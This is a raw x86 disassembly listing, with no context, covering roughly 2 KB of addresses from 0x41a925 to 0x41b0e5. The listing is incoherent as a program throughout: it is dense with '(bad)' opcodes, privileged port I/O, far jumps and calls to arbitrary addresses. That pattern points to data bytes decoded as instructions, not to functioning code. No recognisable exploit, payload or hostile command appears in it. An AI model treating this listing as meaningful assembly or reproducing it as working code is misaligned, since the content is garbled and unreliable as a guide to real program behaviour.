  41a925:	xor    edx,ecx
  41a927:	xor    eax,DWORD PTR [eax-0x641fb19c]
  41a92d:	ja     0x41a963
  41a92f:	dec    esp
  41a930:	jno    0x41a954
  41a932:	mov    edx,0xb2fc66e0
  41a937:	das    
  41a938:	sbb    eax,0x3941e940
  41a93d:	xchg   edi,eax
  41a93e:	xor    BYTE PTR [edi-0xa],ch
  41a941:	mov    edx,DWORD PTR [esi]
  41a943:	(bad)  
  41a944:	bound  bx,DWORD PTR [esi]
  41a947:	in     al,dx
  41a948:	ret    0xa448
  41a94b:	dec    ebp
  41a94c:	jae    0x41a90a
  41a94e:	pusha  
  41a94f:	push   ecx
  41a950:	sub    DWORD PTR [edx+0x26],esi
  41a953:	les    ebx,FWORD PTR [ebx-0x3b]
  41a956:	or     eax,0x8158a786
  41a95b:	je     0x41a93d
  41a95d:	(bad)  
  41a95e:	(bad)  
  41a95f:	outs   dx,BYTE PTR ds:[esi]
  41a960:	or     eax,DWORD PTR [esi+0x7d]
  41a963:	jg     0x41a9b5
  41a965:	pop    ebp
  41a966:	div    DWORD PTR [ebp-0x36419570]
  41a96c:	sub    al,0x6c
  41a96e:	xor    ah,0x1d
  41a971:	imul   edi,eax,0x19
  41a974:	in     eax,0xef
  41a976:	mov    edx,0x44e9545d
  41a97b:	or     dl,BYTE PTR [ebp-0x2395b5b8]
  41a981:	sti    
  41a982:	icebp  
  41a983:	push   esp
  41a984:	fdivr  st,st(0)
  41a986:	adc    al,0x6d
  41a988:	sub    eax,0xb18a3f09
  41a98d:	fild   WORD PTR ds:0x7d891260
  41a993:	and    DWORD PTR [esi],ebx
  41a995:	push   ss
  41a996:	lds    eax,FWORD PTR [bx+di-0x13aa]
  41a99b:	inc    esi
  41a99c:	pop    ds
  41a99d:	fnstenv [edi-0x1a]
  41a9a0:	jmp    0x1c73:0xfaeefedc
  41a9a7:	fincstp 
  41a9a9:	or     BYTE PTR [eax+0x22ec9b97],al
  41a9af:	loop   0x41a98c
  41a9b1:	pop    ds
  41a9b2:	vhaddpd xmm4,xmm6,XMMWORD PTR [ebx-0x136f8281]
  41a9ba:	xchg   esp,eax
  41a9bb:	push   0xd051d5d
  41a9c0:	jge    0x41aa11
  41a9c2:	jne    0x41a9e2
  41a9c4:	sbb    eax,0xcd983e7c
  41a9c9:	div    eax
  41a9cb:	xor    eax,0x84f9403f
  41a9d0:	mov    ah,0x6e
  41a9d2:	add    DWORD PTR [esi-0x22],ebx
  41a9d5:	jp     0x41a9f3
  41a9d7:	repnz inc edx
  41a9d9:	and    BYTE PTR [esi],cl
  41a9db:	sbb    dh,BYTE PTR [eax+0x2bf2aa6c]
  41a9e1:	mov    ecx,DWORD PTR [edx]
  41a9e3:	(bad)  
  41a9e4:	mul    DWORD PTR [edx+ebp*2]
  41a9e7:	jnp    0x41a9e0
  41a9e9:	xchg   edi,eax
  41a9ea:	xor    al,0xf2
  41a9ec:	(bad)  
  41a9ed:	xchg   ebp,eax
  41a9ee:	inc    edi
  41a9ef:	cli    
  41a9f0:	push   ebp
  41a9f1:	(bad)  
  41a9f2:	in     al,0x88
  41a9f4:	and    eax,DWORD PTR [eax+eax*1+0x1]
  41a9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9f9:	fistp  DWORD PTR [ebx]
  41a9fb:	or     al,0x7d
  41a9fd:	loopne 0x41a9d5
  41a9ff:	or     ebp,edx
  41aa01:	add    al,0x1f
  41aa03:	fsub   DWORD PTR [ecx]
  41aa05:	test   eax,0x64886b97
  41aa0a:	push   eax
  41aa0b:	push   edi
  41aa0c:	mov    cl,0xfb
  41aa0e:	pop    ebp
  41aa0f:	shr    esi,1
  41aa11:	dec    ebp
  41aa12:	lods   eax,DWORD PTR ds:[esi]
  41aa13:	xchg   esp,eax
  41aa14:	fisttp WORD PTR [ebx]
  41aa16:	dec    esp
  41aa17:	adc    esp,edx
  41aa19:	ja     0x41a99d
  41aa1b:	mov    ah,0x75
  41aa1d:	out    dx,eax
  41aa1e:	push   0x1ff5ce03
  41aa23:	repz ja 0x41aa44
  41aa26:	mov    bl,0xcd
  41aa28:	ds loopne 0x41aa43
  41aa2b:	(bad)  
  41aa2c:	call   0x385c3b11
  41aa31:	xchg   ecx,eax
  41aa32:	adc    DWORD PTR [ebx],0xcf0f9cfd
  41aa38:	mov    al,ds:0xa88507bb
  41aa3d:	mov    ch,0xbb
  41aa3f:	xor    al,0x7e
  41aa41:	or     DWORD PTR [ebp+0x45],0x36
  41aa45:	cmp    eax,0x47a4ce55
  41aa4a:	mov    ds:0x960e650,al
  41aa4f:	mov    al,ds:0x3ff40f48
  41aa54:	shr    bh,0x26
  41aa57:	inc    edx
  41aa58:	xchg   esp,eax
  41aa59:	mov    ecx,0x5c0bb6b8
  41aa5e:	ja     0x41aa0f
  41aa60:	out    0x6a,al
  41aa62:	neg    DWORD PTR [edx+0x206eae7b]
  41aa68:	dec    ebx
  41aa69:	daa    
  41aa6a:	sub    DWORD PTR ds:0xb4784ac4,edi
  41aa70:	jne    0x41aa1e
  41aa72:	pop    ebp
  41aa73:	or     DWORD PTR [ecx+edx*1],0xffffffdf
  41aa77:	push   ebp
  41aa78:	in     eax,dx
  41aa79:	mov    ch,0x8a
  41aa7b:	fwait
  41aa7c:	(bad)  
  41aa7d:	push   ebx
  41aa7e:	add    ch,dh
  41aa80:	fs std 
  41aa82:	retf   
  41aa83:	fwait
  41aa84:	sbb    eax,0x229a7f66
  41aa89:	sbb    DWORD PTR [ebp+0x3427c4cc],0xfffffff1
  41aa90:	and    ebp,0x32
  41aa93:	int3   
  41aa94:	xchg   DWORD PTR [ecx-0x5b],eax
  41aa97:	call   0xd776ac66
  41aa9c:	lock push 0x7b
  41aa9f:	ds adc al,0x53
  41aaa2:	cmp    eax,0x948b49ff
  41aaa7:	mov    ds:0xc6de40e1,eax
  41aaac:	push   ss
  41aaad:	xor    BYTE PTR [esi+0x510e73ed],ch
  41aab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab4:	cmp    ah,ah
  41aab6:	js     0x41aa97
  41aab8:	jbe    0x41aaec
  41aaba:	aad    0x22
  41aabc:	or     eax,0x6bca65c1
  41aac1:	ffreep st(7)
  41aac3:	popa   
  41aac4:	pop    ecx
  41aac5:	xor    bh,BYTE PTR [esi]
  41aac7:	adc    ch,BYTE PTR [esi]
  41aac9:	and    eax,0xb03050be
  41aace:	jmp    0x7a173859
  41aad3:	xchg   ecx,ecx
  41aad5:	adc    edi,DWORD PTR [ebp+ebx*8+0x69]
  41aad9:	das    
  41aada:	mov    edi,0x8f9824da
  41aadf:	fsub   DWORD PTR [ebx+0x11510167]
  41aae5:	or     DWORD PTR [esi],ebx
  41aae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aae8:	out    dx,eax
  41aae9:	loop   0x41aaa9
  41aaeb:	jb     0x41ab55
  41aaed:	imul   ecx,DWORD PTR [edi+0x12],0x3a4101fa
  41aaf4:	dec    edi
  41aaf5:	lods   eax,DWORD PTR ds:[esi]
  41aaf6:	push   ss
  41aaf7:	mov    ds:0xedd1bfb9,al
  41aafc:	sbb    esi,DWORD PTR ss:[ebp+0x35700cda]
  41ab03:	mov    esp,0x839dac7e
  41ab08:	pop    ebp
  41ab09:	or     eax,0x683d0b63
  41ab0e:	jp     0x41ab02
  41ab10:	pop    esi
  41ab11:	mov    esi,0xdd96ad3e
  41ab16:	lods   al,BYTE PTR ds:[esi]
  41ab17:	sub    edx,DWORD PTR [esi+edi*8+0x45]
  41ab1b:	xor    eax,0x361f972f
  41ab20:	mov    al,ds:0x575e7aba
  41ab25:	setbe  BYTE PTR [ecx+0x7b6d5a8f]
  41ab2c:	push   ds
  41ab2d:	in     al,0x1c
  41ab2f:	out    0x4e,al
  41ab31:	jmp    0x9f7917e
  41ab36:	sub    eax,0x1cbbdbf9
  41ab3b:	cwde   
  41ab3c:	cmp    al,0x21
  41ab3e:	xor    DWORD PTR [esi-0x4a],edx
  41ab41:	ret    0x98e8
  41ab44:	cs xchg ecx,eax
  41ab46:	jnp    0x41ab6f
  41ab48:	pop    eax
  41ab49:	cmp    eax,0xf7ddd58a
  41ab4e:	pop    edx
  41ab4f:	push   0x1aa17db0
  41ab54:	ror    DWORD PTR gs:[ebp-0x43],1
  41ab58:	adc    DWORD PTR [ebp-0x68],edx
  41ab5b:	das    
  41ab5c:	add    esi,DWORD PTR [eax]
  41ab5e:	dec    esi
  41ab5f:	or     al,0x7a
  41ab61:	xlat   BYTE PTR ds:[ebx]
  41ab62:	add    dl,BYTE PTR [esi]
  41ab64:	fwait
  41ab65:	and    eax,0x22bc1a7c
  41ab6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6b:	inc    edi
  41ab6c:	xor    bh,bl
  41ab6e:	pop    esp
  41ab6f:	repnz out dx,al
  41ab71:	pop    ecx
  41ab72:	addr16 jge 0x41abd5
  41ab75:	dec    ebx
  41ab76:	mov    eax,0xeb058b6a
  41ab7b:	mov    al,ds:0x65d7e860
  41ab80:	lahf   
  41ab81:	ja     0x41abae
  41ab83:	fild   WORD PTR [ecx+0x15bada1]
  41ab89:	ins    BYTE PTR es:[edi],dx
  41ab8a:	sub    al,0xd2
  41ab8c:	test   BYTE PTR [ebp-0x782d42a2],cl
  41ab92:	push   edi
  41ab93:	sbb    al,0x98
  41ab95:	xor    eax,0xf6a9c126
  41ab9a:	ins    DWORD PTR es:[edi],dx
  41ab9b:	aad    0x1e
  41ab9d:	gs into 
  41ab9f:	push   ebp
  41aba0:	dec    eax
  41aba1:	popa   
  41aba2:	sub    bh,BYTE PTR [eax-0x4021f736]
  41aba8:	shl    DWORD PTR [eax-0x6d],1
  41abab:	into   
  41abac:	lods   al,BYTE PTR ds:[esi]
  41abad:	mov    fs,WORD PTR [ebx-0x28]
  41abb0:	xchg   ebp,eax
  41abb1:	sub    DWORD PTR [eax+0x79e9ee4d],edx
  41abb7:	mov    ebp,0xcc7b48d1
  41abbc:	neg    BYTE PTR [ebp+ebx*8-0x7c]
  41abc0:	dec    edx
  41abc1:	add    BYTE PTR [ebp+0x7240e81a],al
  41abc7:	gs iret 
  41abc9:	cld    
  41abca:	inc    edx
  41abcb:	adc    al,0x1
  41abcd:	jo     0x41ac26
  41abcf:	mov    esi,0x887f197e
  41abd4:	out    dx,al
  41abd5:	jmp    0xd326:0x24c72b9b
  41abdc:	fdiv   st(0),st
  41abde:	popa   
  41abdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe0:	jnp    0x41abec
  41abe2:	or     al,0xb2
  41abe4:	lods   al,BYTE PTR ds:[esi]
  41abe5:	mov    edx,0x3d0d46ac
  41abea:	mov    WORD PTR [edi-0x6b],fs
  41abed:	lea    esp,[ecx-0x4]
  41abf0:	loop   0x41ac4f
  41abf2:	iret   
  41abf3:	mov    edx,0xff6de01d
  41abf8:	push   ds
  41abf9:	pop    edi
  41abfa:	jmp    0x61097888
  41abff:	xor    esi,DWORD PTR ds:0xe7aba4a4
  41ac05:	sub    DWORD PTR [edx],ebx
  41ac07:	jae    0x41ab8c
  41ac09:	aas    
  41ac0a:	rcr    BYTE PTR [ebx+0x17968f34],1
  41ac10:	mov    eax,0x5e7ec943
  41ac15:	(bad)  
  41ac16:	mov    eax,0x8838eefb
  41ac1b:	jb     0x41abab
  41ac1d:	or     DWORD PTR [eax],esi
  41ac1f:	mov    ds:0x39f7daa9,eax
  41ac24:	out    dx,al
  41ac25:	fwait
  41ac26:	adc    DWORD PTR [edx],edx
  41ac28:	sub    ah,BYTE PTR [eax-0x61]
  41ac2b:	pop    edx
  41ac2c:	daa    
  41ac2d:	xor    dh,cl
  41ac2f:	dec    esp
  41ac30:	xor    al,0x62
  41ac32:	dec    esi
  41ac33:	push   0xffffffdb
  41ac35:	inc    ebx
  41ac36:	in     eax,0x9f
  41ac38:	push   edi
  41ac39:	jmp    0x41abde
  41ac3b:	ja     0x41ac0d
  41ac3d:	sahf   
  41ac3e:	test   al,0xd2
  41ac40:	and    al,0xed
  41ac42:	stos   DWORD PTR es:[edi],eax
  41ac43:	mov    ebp,0x29149e92
  41ac48:	lea    ecx,[edx+ebx*1]
  41ac4b:	or     ecx,DWORD PTR [esi-0x1b]
  41ac4e:	enter  0x838a,0x73
  41ac52:	mov    ch,0x38
  41ac55:	jmp    0x811d843f
  41ac5a:	loope  0x41ac33
  41ac5c:	jnp    0x41ac9f
  41ac5e:	mov    WORD PTR [ebx-0x6c],gs
  41ac61:	mov    dh,0xcb
  41ac63:	mov    eax,ds:0x87360e2a
  41ac68:	dec    ebx
  41ac69:	xchg   ecx,eax
  41ac6a:	sbb    cl,dl
  41ac6c:	pop    ss
  41ac6d:	nop
  41ac6e:	xchg   ebp,eax
  41ac6f:	dec    ebx
  41ac70:	jns    0x41acd9
  41ac72:	push   ecx
  41ac73:	in     eax,0xd8
  41ac75:	sub    edx,DWORD PTR [eax]
  41ac77:	mov    ecx,0x72eda62a
  41ac7c:	mov    ds:0x3c566ca6,al
  41ac81:	adc    al,0xc9
  41ac83:	mov    edx,DWORD PTR [eax-0x253bae8b]
  41ac89:	mov    ds:0x65aba89b,eax
  41ac8e:	adc    bl,BYTE PTR [ebx+0x44e7c770]
  41ac94:	(bad)  
  41ac95:	shld   DWORD PTR [ecx],esp,cl
  41ac98:	cmp    ah,BYTE PTR [edi+0x59]
  41ac9b:	mov    edx,0x77a47a73
  41aca0:	ficom  DWORD PTR [esi]
  41aca2:	lea    edi,[eax+0x1d]
  41aca5:	add    al,0x8c
  41aca7:	adc    DWORD PTR [ebx+ecx*4+0x57772db7],edi
  41acae:	or     eax,0x9b3f2b17
  41acb3:	out    dx,al
  41acb4:	out    0xfa,al
  41acb6:	gs int3 
  41acb8:	mov    ebp,0xc503e979
  41acbd:	adc    eax,0x81d0a4ac
  41acc2:	enter  0x4a89,0xbb
  41acc6:	sub    dh,0x49
  41acc9:	ss loop 0x41ad2a
  41accc:	jmp    0x1bab76ac
  41acd1:	(bad)  
  41acd2:	les    edx,FWORD PTR [edx+0x1749383e]
  41acd8:	js     0x41ad32
  41acda:	fild   QWORD PTR [ecx]
  41acdc:	mov    bh,0x7b
  41acde:	popa   
  41acdf:	add    dl,bl
  41ace1:	lods   al,BYTE PTR ds:[esi]
  41ace2:	add    eax,0x4b3bfbb8
  41ace7:	xchg   edi,eax
  41ace8:	div    BYTE PTR [eax+0x49ab7189]
  41acee:	leave  
  41acef:	scas   eax,DWORD PTR es:[edi]
  41acf0:	mov    ah,0xeb
  41acf2:	fsubr  QWORD PTR [edi-0x5d]
  41acf5:	jle    0x41ad2c
  41acf7:	cmp    ecx,esi
  41acf9:	mov    dh,0xce
  41acfb:	in     eax,dx
  41acfc:	push   0xffffff8d
  41acfe:	sbb    ah,BYTE PTR [esp+eax*2]
  41ad01:	sub    BYTE PTR ss:[ecx],al
  41ad04:	jmp    0x41acfc
  41ad06:	fidivr DWORD PTR [edx+ebx*8-0x1d86fa14]
  41ad0d:	in     eax,0x21
  41ad0f:	sub    eax,0xb201e3fc
  41ad14:	adc    DWORD PTR [esi+edi*1-0x54],esp
  41ad18:	je     0x41ad07
  41ad1a:	aad    0x83
  41ad1c:	mov    ebx,0xf0d7ef35
  41ad21:	mov    dl,0xb0
  41ad23:	inc    ebp
  41ad24:	rcl    ch,1
  41ad26:	hlt    
  41ad27:	nop
  41ad28:	fsubr  DWORD PTR [eax-0x2732f0f7]
  41ad2e:	mov    WORD PTR [eax],cs
  41ad30:	push   0x7f1bb873
  41ad35:	in     al,0xa7
  41ad37:	push   0xffffffdc
  41ad39:	xor    BYTE PTR ds:0xa27a59d5,ch
  41ad3f:	cmp    ecx,ebx
  41ad41:	lea    edx,[ecx]
  41ad43:	or     bh,bh
  41ad45:	jo     0x41adad
  41ad47:	aam    0xa6
  41ad49:	stos   BYTE PTR es:[edi],al
  41ad4a:	add    bh,BYTE PTR [eax+esi*1+0x1f]
  41ad4e:	ret    0xfc97
  41ad51:	(bad)  
  41ad52:	aad    0xf4
  41ad54:	mov    cl,0xa9
  41ad56:	cmp    ch,BYTE PTR [ebx]
  41ad58:	xor    eax,0x9079fd33
  41ad5d:	add    ah,ch
  41ad5f:	popf   
  41ad60:	dec    edi
  41ad61:	aas    
  41ad62:	mov    WORD PTR [ecx-0x14d107c7],es
  41ad68:	dec    ebp
  41ad69:	jg     0x41ad6b
  41ad6b:	lahf   
  41ad6c:	mov    ds:0x714b6b8c,al
  41ad71:	xchg   esp,eax
  41ad72:	xor    DWORD PTR [eax+0x29],0xda46b3c5
  41ad79:	dec    ecx
  41ad7a:	enter  0xf3ec,0xb8
  41ad7e:	jno    0x41ad41
  41ad80:	pop    ebp
  41ad81:	xor    ebx,edx
  41ad83:	call   0xe4eb6791
  41ad88:	test   eax,0x956e614b
  41ad8d:	outs   dx,DWORD PTR ds:[esi]
  41ad8e:	ficomp WORD PTR [ecx+0x1]
  41ad91:	mov    bl,0xf
  41ad93:	cld    
  41ad94:	call   0xe97d:0xbad365ae
  41ad9b:	cmp    al,0x6a
  41ad9d:	pop    ss
  41ad9e:	lock sub DWORD PTR [ebp-0x44872f3e],0x74
  41ada6:	clc    
  41ada7:	pop    es
  41ada8:	scas   eax,DWORD PTR es:[edi]
  41ada9:	push   ecx
  41adaa:	test   al,0x62
  41adac:	push   edx
  41adad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adae:	xor    dh,BYTE PTR ds:0x8b3a5d36
  41adb4:	add    eax,0x8a399a07
  41adb9:	das    
  41adba:	cmp    edx,DWORD PTR [ecx]
  41adbc:	push   ebx
  41adbd:	out    dx,al
  41adbe:	sar    bl,cl
  41adc0:	aam    0xdb
  41adc2:	jnp    0x41adc3
  41adc4:	ins    BYTE PTR es:[edi],dx
  41adc5:	push   esp
  41adc6:	xor    eax,0x70a9b265
  41adcb:	(bad)  
  41adcc:	sbb    eax,0xb6714549
  41add1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41add2:	and    al,0x27
  41add4:	iret   
  41add5:	add    BYTE PTR [eax+ebp*1],dl
  41add8:	pop    ecx
  41add9:	aaa    
  41adda:	out    dx,eax
  41addb:	inc    ecx
  41addc:	test   eax,0x85a3972c
  41ade1:	jbe    0x41adce
  41ade3:	ffree  st(3)
  41ade5:	test   al,0xac
  41ade7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ade8:	adc    al,0xf2
  41adea:	jecxz  0x41ae43
  41adec:	xor    DWORD PTR [edx],ebp
  41adee:	fld    QWORD PTR ds:0x60f91a15
  41adf4:	xchg   edx,eax
  41adf5:	add    eax,0xf8b6959d
  41adfa:	sub    ch,bh
  41adfc:	xchg   bh,dh
  41adfe:	lahf   
  41adff:	pop    ds
  41ae00:	sbb    al,0xc2
  41ae02:	ins    DWORD PTR es:[edi],dx
  41ae03:	adc    DWORD PTR [edx],ebx
  41ae05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae06:	in     eax,0xa1
  41ae08:	iret   
  41ae09:	mov    ch,0x5f
  41ae0b:	out    0x66,al
  41ae0d:	or     BYTE PTR [edi],0x73
  41ae10:	les    esp,FWORD PTR [ecx+0x202dae28]
  41ae16:	call   0x4e38ce9e
  41ae1b:	add    ebp,0xd92adec5
  41ae21:	and    bh,BYTE PTR [eax+0x12271e2b]
  41ae27:	(bad)  
  41ae29:	xchg   bl,bl
  41ae2b:	data16 adc al,0xf
  41ae2e:	mov    dl,0x12
  41ae30:	out    0x12,eax
  41ae32:	cmp    al,BYTE PTR ds:0x16801d7f
  41ae38:	in     al,0x2a
  41ae3a:	fninit 
  41ae3c:	ins    BYTE PTR es:[edi],dx
  41ae3d:	loopne 0x41ae4f
  41ae3f:	mov    BYTE PTR [ecx+0x37],ah
  41ae42:	dec    ecx
  41ae43:	cs pop ds
  41ae45:	sbb    BYTE PTR [edi],0x40
  41ae48:	mov    ds:0xba59adc8,eax
  41ae4d:	sub    eax,0x908ac183
  41ae52:	dec    esp
  41ae53:	fs mov ch,0x4f
  41ae56:	jo     0x41ae82
  41ae58:	or     al,0x38
  41ae5a:	ja     0x41aed1
  41ae5c:	or     eax,0xde1ea453
  41ae61:	pushf  
  41ae62:	cwde   
  41ae63:	inc    eax
  41ae64:	pusha  
  41ae65:	mov    edi,0x84a0c30e
  41ae6a:	pushf  
  41ae6b:	inc    ebx
  41ae6c:	into   
  41ae6d:	les    edi,FWORD PTR [edx]
  41ae6f:	aas    
  41ae70:	out    0xa1,eax
  41ae72:	adc    al,BYTE PTR [ebp-0x2d]
  41ae75:	outs   dx,DWORD PTR ds:[esi]
  41ae76:	mov    DWORD PTR [eax-0x35],esi
  41ae79:	jl     0x41ae17
  41ae7b:	sahf   
  41ae7c:	mov    ecx,0x5338e507
  41ae81:	mov    al,ds:0x678583a0
  41ae86:	(bad)  
  41ae87:	scas   al,BYTE PTR es:[edi]
  41ae88:	out    dx,al
  41ae89:	cmp    edi,esp
  41ae8b:	xor    DWORD PTR [ecx],esp
  41ae8d:	xlat   BYTE PTR ds:[ebx]
  41ae8e:	dec    edx
  41ae8f:	in     eax,dx
  41ae90:	ss in  al,0x20
  41ae93:	int3   
  41ae94:	les    edx,FWORD PTR [eax-0x57017362]
  41ae9a:	jge    0x41aeeb
  41ae9c:	or     edi,DWORD PTR [eax-0x29]
  41ae9f:	retf   0x33a
  41aea2:	pop    es
  41aea3:	hlt    
  41aea4:	test   eax,0x54d2fba
  41aea9:	mov    edi,0xebc13fba
  41aeae:	mov    ?,WORD PTR [eax+0x2fc02da4]
  41aeb4:	mov    al,ds:0x5874d3e9
  41aeb9:	sub    BYTE PTR [ebx],0xd4
  41aebc:	in     eax,dx
  41aebd:	(bad)  
  41aebe:	xchg   esi,eax
  41aebf:	data16 sub BYTE PTR [ebp-0x39],dh
  41aec3:	push   ecx
  41aec4:	pop    esi
  41aec5:	add    al,0xcf
  41aec7:	mov    esi,0x90c8baf
  41aecc:	mov    eax,ds:0xd67899eb
  41aed1:	jmp    0xf143:0x420d6b59
  41aed8:	gs (bad) 
  41aeda:	fld    DWORD PTR [ecx-0x32]
  41aedd:	(bad)  
  41aedf:	cs repnz xchg ecx,eax
  41aee2:	into   
  41aee3:	adc    eax,0x1c89876c
  41aee8:	pop    ebp
  41aee9:	or     al,0x54
  41aeeb:	lea    ebx,[edx+0x32073aad]
  41aef1:	fcmovnbe st,st(6)
  41aef3:	fwait
  41aef4:	mov    dl,0x68
  41aef6:	pop    es
  41aef7:	mov    dl,0xd2
  41aef9:	repnz lds eax,FWORD PTR fs:[ebx+ebp*2+0x7b]
  41aeff:	shr    BYTE PTR [edi+0x6b49fd25],1
  41af05:	jno    0x41af00
  41af07:	fild   DWORD PTR [edi+edi*1-0x7f]
  41af0b:	in     al,0x0
  41af0d:	sbb    al,0xfc
  41af0f:	mov    ah,0x8b
  41af11:	icebp  
  41af12:	popf   
  41af13:	xchg   edx,eax
  41af14:	ds cmp eax,0xe45256ca
  41af1a:	inc    ebp
  41af1b:	pop    ebp
  41af1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af1e:	inc    ebp
  41af1f:	jmp    0x41af30
  41af21:	cmp    al,ch
  41af23:	mov    ch,0x77
  41af25:	mov    ds,WORD PTR [edx]
  41af27:	cmp    DWORD PTR [ebp+0x4c],edi
  41af2a:	nop
  41af2b:	pop    ebx
  41af2c:	adc    BYTE PTR [ebx],al
  41af2e:	sti    
  41af2f:	jbe    0x41af31
  41af31:	call   0xb12a1ba5
  41af36:	pop    ds
  41af37:	xor    BYTE PTR [ebp*2-0x64364e60],al
  41af3e:	(bad)  
  41af3f:	rcl    DWORD PTR [eax-0x3bee92f1],1
  41af45:	pop    ecx
  41af46:	jb     0x41af70
  41af48:	ret    
  41af49:	pop    edx
  41af4a:	jle    0x41af97
  41af4c:	outs   dx,BYTE PTR ds:[esi]
  41af4d:	daa    
  41af4e:	mov    ecx,0x7a7f98e8
  41af54:	and    DWORD PTR [edi+0x59],ecx
  41af57:	dec    esi
  41af58:	mov    esi,0x86df257e
  41af5d:	pop    ds
  41af5e:	and    DWORD PTR [edx-0x2f],ebx
  41af61:	cmp    eax,ebp
  41af63:	mov    ecx,0x4fe9b0c4
  41af68:	fcomp  QWORD PTR [ebp+eax*8+0x54]
  41af6c:	xchg   BYTE PTR [ecx+0x2f9a123e],al
  41af72:	sti    
  41af73:	test   al,0x92
  41af75:	in     al,0xb0
  41af77:	loop   0x41afc4
  41af79:	jo     0x41af8e
  41af7b:	es and eax,0x59e15a9b
  41af81:	js     0x41af90
  41af83:	xor    BYTE PTR [edx-0xa14261f],0xe7
  41af8a:	hlt    
  41af8b:	repz mov edx,0xaf5a03c9
  41af91:	jp     0x41afd8
  41af93:	adc    esp,DWORD PTR [ebp+0x75]
  41af96:	sub    BYTE PTR [eax+0x1ba6af87],0xd9
  41af9d:	mov    DWORD PTR ds:0xad012441,eax
  41afa3:	add    DWORD PTR gs:[edi],esi
  41afa6:	addr16 in al,dx
  41afa8:	stos   DWORD PTR es:[edi],eax
  41afa9:	sbb    bl,BYTE PTR [ebx-0x39]
  41afac:	and    dh,bh
  41afae:	or     eax,0xd9218086
  41afb3:	enter  0x8487,0x65
  41afb7:	in     al,0x42
  41afb9:	and    BYTE PTR [edx],ch
  41afbb:	in     eax,dx
  41afbc:	sub    esi,DWORD PTR [ebp-0x17]
  41afbf:	dec    ecx
  41afc0:	jnp    0x41b033
  41afc2:	add    eax,ebx
  41afc4:	mov    bl,0x35
  41afc6:	out    0x60,eax
  41afc8:	xor    eax,0x9095693d
  41afcd:	mov    al,0x7e
  41afcf:	sbb    edi,DWORD PTR [edx+ecx*8-0x32]
  41afd3:	(bad)  [ebx+ecx*1-0x215f2ef8]
  41afda:	and    esp,DWORD PTR [edx]
  41afdc:	mov    cs,WORD PTR [eax-0x5b5117b4]
  41afe2:	push   es
  41afe3:	(bad)  
  41afe4:	mov    eax,0xd8f918c8
  41afe9:	(bad)  
  41afea:	pop    esi
  41afeb:	rcr    esi,0xd6
  41afee:	push   esi
  41afef:	or     al,0xa4
  41aff1:	lods   al,BYTE PTR ds:[esi]
  41aff2:	in     al,0x1a
  41aff4:	ja     0x41b06e
  41aff6:	das    
  41aff7:	xor    DWORD PTR [ebx+0x7e8f2c5e],esp
  41affd:	lock sbb eax,0x7db80433
  41b003:	stos   BYTE PTR es:[edi],al
  41b004:	mov    ah,0xdb
  41b006:	mov    dl,0x15
  41b008:	add    al,0x49
  41b00a:	cmp    BYTE PTR [ebx-0x49d501f9],bh
  41b010:	inc    edx
  41b011:	xlat   BYTE PTR ds:[ebx]
  41b012:	mov    esi,0x5206a09b
  41b017:	fs neg BYTE PTR ss:[edx-0x522132a7]
  41b01f:	sub    eax,0x3834a9a2
  41b024:	mov    al,0x21
  41b026:	dec    ebx
  41b027:	xchg   ebp,eax
  41b028:	mov    ebp,0x31f22776
  41b02d:	jno    0x41b081
  41b02f:	retf   0xb6df
  41b032:	sbb    eax,DWORD PTR [eax-0x31e6e960]
  41b038:	das    
  41b039:	mov    esi,0x8f998000
  41b03e:	pop    ds
  41b03f:	pop    edx
  41b040:	mov    ch,0x5a
  41b042:	je     0x41b049
  41b044:	push   esp
  41b045:	push   0x1a
  41b047:	shrd   DWORD PTR [ebx+ebp*1-0x5f],ebx,0xab
  41b04d:	mov    ebp,0x7c3c9489
  41b052:	jne    0x41b04d
  41b054:	shr    BYTE PTR [eax-0x42],1
  41b057:	sbb    eax,0x87865c38
  41b05c:	inc    edi
  41b05d:	or     edi,DWORD PTR [ebx+0x1384c653]
  41b063:	push   0xbb75f01b
  41b068:	adc    BYTE PTR [esi],bl
  41b06a:	cwde   
  41b06b:	ret    
  41b06c:	popf   
  41b06d:	and    eax,0xc2ac21f3
  41b072:	out    dx,eax
  41b073:	inc    ebx
  41b074:	xchg   BYTE PTR ds:0xa072f92c,ch
  41b07a:	pop    eax
  41b07b:	sbb    BYTE PTR [eax-0x2e],cl
  41b07e:	mov    ds:0xfca14d21,al
  41b083:	outs   dx,DWORD PTR ds:[esi]
  41b084:	push   eax
  41b085:	jno    0x41b0cb
  41b087:	cmp    al,0x33
  41b089:	rcl    DWORD PTR [eax],cl
  41b08b:	jmp    0xa810:0x26e05957
  41b092:	mov    ebp,0x63586a52
  41b097:	add    eax,0xf3b6642c
  41b09c:	not    BYTE PTR [eax+0x3025ceb3]
  41b0a2:	aam    0xfd
  41b0a4:	hlt    
  41b0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a6:	xchg   edi,eax
  41b0a7:	push   esp
  41b0a8:	mov    es,WORD PTR [edi]
  41b0aa:	pusha  
  41b0ab:	repz cwde 
  41b0ad:	pop    esi
  41b0ae:	sbb    BYTE PTR [edi+0xbaefb9e],bl
  41b0b4:	jne    0x41b067
  41b0b6:	or     eax,0x4b39f4da
  41b0bb:	adc    BYTE PTR [ebx-0x44d6e9a7],0xe8
  41b0c2:	in     eax,dx
  41b0c3:	aas    
  41b0c4:	and    DWORD PTR [ebx],eax
  41b0c6:	xchg   BYTE PTR [ebx-0x61],ch
  41b0c9:	and    edi,ebx
  41b0cb:	in     al,0x75
  41b0cd:	sub    DWORD PTR [eax-0x76bd9b58],eax
  41b0d3:	dec    ebx
  41b0d4:	call   0x5acd8c56
  41b0d9:	jle    0x41b0fe
  41b0db:	inc    eax
  41b0dc:	dec    eax
  41b0dd:	jae    0x41b11a
  41b0df:	sub    DWORD PTR [edi-0x65],esi
  41b0e2:	outs   dx,DWORD PTR ds:[esi]
  41b0e3:	xchg   ecx,eax
  41b0e4:	pop    ss
  41b0e5:	cs std 
